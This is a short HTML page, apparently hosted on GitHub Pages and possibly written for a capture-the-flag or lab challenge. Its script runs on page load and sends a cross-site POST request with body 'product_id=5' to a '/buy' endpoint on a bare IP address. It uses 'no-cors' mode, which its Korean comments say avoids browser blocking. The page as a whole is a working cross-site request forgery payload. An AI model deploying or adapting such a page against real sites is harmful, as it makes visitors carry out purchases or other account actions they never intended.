# CaramelPain.github.io

<!DOCTYPE html>
<html>
<body>
    <script>
        // 폼 대신 fetch를 사용하여 더 세밀하게 요청을 보낼 수 있습니다.
        fetch('http://15.164.98.47:32689/buy', {
            method: 'POST',
            mode: 'no-cors', // 브라우저 차단을 피하기 위한 설정
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'product_id=5'
        }).then(() => {
            console.log('Request sent');
        });
    </script>
</body>
</html>
